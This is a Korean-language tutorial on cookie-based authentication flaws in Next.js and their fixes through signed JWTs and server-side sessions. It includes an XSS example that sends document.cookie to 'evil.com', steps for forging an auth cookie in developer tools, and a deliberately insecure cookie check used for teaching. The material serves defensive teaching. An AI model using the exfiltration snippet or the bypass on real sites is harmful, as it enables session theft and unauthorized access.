# 참고 3 - 쿠키 보안과 JWT 인증

> **학습 목표**: 쿠키 기반 인증의 보안 취약점과 JWT를 통한 해결 방법 이해  
> **난이도**: ⭐⭐⭐ (중급)  
> **예상 소요 시간**: 30분

---

## 📋 3줄 요약

```
1. 쿠키만으로는 보안 취약 (F12로 조작 가능)
2. 해결: API에서 JWT 발급 → Middleware에서 서명 검증
3. 서버만 아는 비밀키로 서명 → 조작 불가능
```

---

## 1. 핵심 문제

### 현재 방식의 취약점

```typescript
// API에서 쿠키 설정
res.setHeader('Set-Cookie', 'passwordVerified=true; HttpOnly');

// Middleware에서 체크
const verified = request.cookies.get('passwordVerified')?.value;
if (verified === 'true') {
    return NextResponse.next();  // 통과
}
```

### 🚨 공격 시나리오

```
1. F12 → Application → Cookies
2. 새 쿠키 추가:
   Name: passwordVerified
   Value: true
   HttpOnly: ✅
3. /mypage 접근
4. Middleware: 쿠키 값 확인 → "true" 발견
5. 인증 성공 😱 (비밀번호 없이 우회!)
```

**문제:** 개발자 도구로 쿠키를 직접 만들 수 있음

---

## 2. HttpOnly의 역할과 한계

### ✅ HttpOnly가 방어하는 것

```javascript
// XSS 공격 시도
<script>
  // 악성 스크립트가 쿠키 훔치기 시도
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>

// HttpOnly 쿠키:
document.cookie  // "passwordVerified" 안 보임 → 훔칠 수 없음 ✅
```

**방어:** JavaScript 코드로 쿠키 접근 차단 (XSS 방어)

---

### ❌ HttpOnly가 방어 못 하는 것

```
개발자 도구 (F12)로 직접 수정
  ↓
사용자가 직접 하는 행위
  ↓
막을 수 없음 (브라우저 기능)
```

---

### 정리

| 공격 방법 | JavaScript 콘솔 | 개발자 도구 (Application) |
|----------|----------------|-------------------------|
| **쿠키 읽기** | ❌ 차단됨 | ✅ 가능 |
| **쿠키 쓰기** | ❌ 차단됨 | ✅ 가능 |
| **쿠키 삭제** | ❌ 차단됨 | ✅ 가능 |

**결론:** HttpOnly는 XSS 방어용이지, 개발자 도구 조작은 못 막음

---

## 3. 해결책 1: JWT (서명 검증)

### JWT란?

**JSON Web Token = 서명된 토큰**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9  ← Header (알고리즘)
.
eyJ2ZXJpZmllZCI6dHJ1ZX0                ← Payload (데이터)
.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← Signature (서명)
                                          ^^^^^^^^^^^^^^^^
                                          서버만 아는 비밀키로 생성
```

---

### 구현 방법

#### Step 1: API에서 JWT 발급

```typescript
// src/pages/api/verify-password.ts
import { SignJWT } from 'jose';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
    const { password } = req.body;
    
    if (password === SITE_PASSWORD) {
        // JWT 생성
        const secret = new TextEncoder().encode(process.env.JWT_SECRET);
        const token = await new SignJWT({ verified: true })
            .setProtectedHeader({ alg: 'HS256' })
            .setExpirationTime('24h')
            .sign(secret);
        
        // HttpOnly 쿠키에 JWT 저장
        res.setHeader('Set-Cookie', [
            `authToken=${token}; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=${60 * 60 * 24}`
        ]);
        
        return res.status(200).json({ success: true });
    }
    
    return res.status(401).json({ success: false });
}
```

---

#### Step 2: Middleware에서 JWT 검증

```typescript
// middleware.ts
import { jwtVerify } from 'jose';

export async function middleware(request: NextRequest) {
    const { pathname } = request.nextUrl;
    
    if (pathname === '/verify') return NextResponse.next();
    if (!isProtectedPath(pathname)) return NextResponse.next();
    
    const token = request.cookies.get('authToken')?.value;
    
    if (!token) {
        return NextResponse.redirect(new URL('/verify', request.url));
    }
    
    try {
        // 🔑 핵심: 서명 검증
        const secret = new TextEncoder().encode(process.env.JWT_SECRET);
        const { payload } = await jwtVerify(token, secret);
        
        // ✅ 서명 검증 성공 → 서버가 발급한 토큰
        return NextResponse.next();
    } catch (error) {
        // ❌ 서명 검증 실패 → 조작된 토큰 또는 만료
        return NextResponse.redirect(new URL('/verify', request.url));
    }
}
```

---

### 왜 안전한가?

#### 공격 시도

```
1. F12 → Application → Cookies
2. authToken 값 수정:
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.FAKE_DATA.FAKE_SIGNATURE
   ↓
3. /mypage 접근
   ↓
4. jwtVerify(token, SECRET) 실행
   ↓
5. 서명 검증:
   - 서버가 Payload를 SECRET으로 다시 서명
   - 계산된 서명: SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
   - 쿠키의 서명: FAKE_SIGNATURE
   - 불일치! ❌
   ↓
6. 에러 발생 → /verify로 리다이렉트 ✅
```

**핵심:** 서버만 SECRET_KEY를 알고 있어서 조작 불가능

---

## 4. 해결책 2: 세션 (서버 저장)

### 개념

```
클라이언트: sessionId만 저장
서버: 실제 인증 정보 저장
```

### 구현 방법

#### Step 1: API에서 세션 생성

```typescript
// src/pages/api/verify-password.ts
import { v4 as uuidv4 } from 'uuid';

// 메모리 저장 (간단한 예시)
const sessions = new Map<string, { verified: boolean; expiresAt: number }>();

export default function handler(req: NextApiRequest, res: NextApiResponse) {
    const { password } = req.body;
    
    if (password === SITE_PASSWORD) {
        // 세션 ID 생성
        const sessionId = uuidv4();
        
        // 서버에 세션 저장
        sessions.set(sessionId, {
            verified: true,
            expiresAt: Date.now() + 24 * 60 * 60 * 1000  // 24시간
        });
        
        // 클라이언트에는 세션 ID만 전달
        res.setHeader('Set-Cookie', [
            `sessionId=${sessionId}; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=${60 * 60 * 24}`
        ]);
        
        return res.status(200).json({ success: true });
    }
    
    return res.status(401).json({ success: false });
}
```

---

#### Step 2: Middleware에서 세션 확인

```typescript
// middleware.ts
export function middleware(request: NextRequest) {
    const { pathname } = request.nextUrl;
    
    if (pathname === '/verify') return NextResponse.next();
    if (!isProtectedPath(pathname)) return NextResponse.next();
    
    const sessionId = request.cookies.get('sessionId')?.value;
    
    if (!sessionId) {
        return NextResponse.redirect(new URL('/verify', request.url));
    }
    
    // 서버에서 세션 조회
    const session = sessions.get(sessionId);
    
    if (!session || session.expiresAt < Date.now()) {
        // 세션 없음 또는 만료됨
        sessions.delete(sessionId);
        return NextResponse.redirect(new URL('/verify', request.url));
    }
    
    // ✅ 세션 유효
    return NextResponse.next();
}
```

---

### 왜 안전한가?

```
1. F12 → Application → Cookies
2. sessionId 값 수정:
   sessionId=fake-session-id-123
   ↓
3. /mypage 접근
   ↓
4. sessions.get('fake-session-id-123')
   ↓
5. 서버에 없음 → undefined
   ↓
6. /verify로 리다이렉트 ✅
```

**핵심:** 인증 정보를 서버가 관리 (클라이언트는 ID만 가짐)

---

## 5. 보안 레벨 비교

### Level 1: 단순 쿠키 (현재 학습용)

```typescript
passwordVerified=true
```

**장점:**
- ✅ 구현 간단
- ✅ Middleware 개념 학습에 적합

**단점:**
- ❌ F12로 우회 가능
- ❌ 실무 사용 불가

---

### Level 2: JWT

```typescript
authToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**장점:**
- ✅ 서명 검증으로 조작 방지
- ✅ 서버 상태 불필요 (Stateless)
- ✅ 확장성 좋음 (MSA 적합)

**단점:**
- ⚠️ 토큰 크기 큼
- ⚠️ 강제 만료 어려움 (블랙리스트 필요)

---

### Level 3: 세션

```typescript
sessionId=abc-123-def-456
```

**장점:**
- ✅ 서버에서 완전 제어
- ✅ 즉시 만료 가능
- ✅ 토큰 크기 작음

**단점:**
- ⚠️ 서버 상태 관리 필요 (Redis 등)
- ⚠️ 확장성 고려 필요

---

## 6. 실무 선택 가이드

### JWT를 선택하는 경우

```
✅ MSA (Microservices Architecture)
✅ API 서버가 여러 대
✅ 서버 상태 관리 부담
✅ 모바일 앱 인증
```

### 세션을 선택하는 경우

```
✅ 모놀리식 아키텍처
✅ 즉시 로그아웃 필요
✅ Redis 등 세션 저장소 있음
✅ 보안 요구사항 높음
```

---

## 7. 환경 변수 설정

### .env.local

```bash
# JWT 비밀키 (절대 노출 금지!)
JWT_SECRET=your-super-secret-key-min-32-characters-long

# 사이트 비밀번호
SITE_PASSWORD=demo1234
```

### 비밀키 생성 방법

```bash
# Node.js
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"

# 결과 예시:
# 5f8e9d7c6b5a4e3d2c1b0a9f8e7d6c5b4a3e2d1c0b9a8f7e6d5c4b3a2e1d0c9b
```

---

## 8. 역할별 체크리스트

### 프론트엔드 개발자 (당신)

```
✅ Middleware 구현 (경로 체크)
✅ /verify 페이지 개발
✅ 쿠키 읽기 로직
❌ JWT 발급 (백엔드 역할)
❌ 서명 검증 로직 (백엔드와 협의)
```

### 백엔드/API 개발자

```
✅ JWT 발급 API
✅ 비밀키 관리
✅ 서명 검증 로직
✅ 세션 관리 (세션 방식인 경우)
```

---

## 9. 핵심 정리

### 문제

```
단순 쿠키 (passwordVerified=true)
  ↓
F12로 조작 가능
  ↓
보안 취약 ❌
```

### 해결

```
JWT 또는 세션
  ↓
서버에서 검증
  ↓
조작 불가능 ✅
```

### 당신의 역할

```
1. Middleware에서 쿠키 체크 (이미 구현됨)
2. /verify 페이지 개발 (이미 구현됨)
3. API 개발자에게 요청:
   "JWT 방식으로 토큰 발급해주세요"
```

---

## 10. 다음 단계

### 학습 프로젝트

```
현재: 단순 쿠키 (개념 학습)
  ↓
다음: JWT 방식으로 업그레이드 (보안 학습)
```

### 실무 프로젝트

```
처음부터 JWT 또는 세션 사용
  ↓
백엔드 개발자와 협의
  ↓
API 스펙 정의
```

---

## 11. 참고 자료

### JWT 라이브러리

- [jose](https://github.com/panva/jose) - Edge Runtime 지원 (Next.js Middleware)
- [jsonwebtoken](https://github.com/auth0/node-jsonwebtoken) - Node.js 환경

### 세션 저장소

- [Redis](https://redis.io/) - 인메모리 데이터베이스
- [connect-redis](https://github.com/tj/connect-redis) - Express 세션 저장소

### 보안 가이드

- [OWASP - Session Management](https://owasp.org/www-community/controls/Session_Management_Cheat_Sheet)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)

---

**핵심:** 쿠키는 저장 수단일 뿐, 보안은 서버 검증으로 확보합니다! 🔒
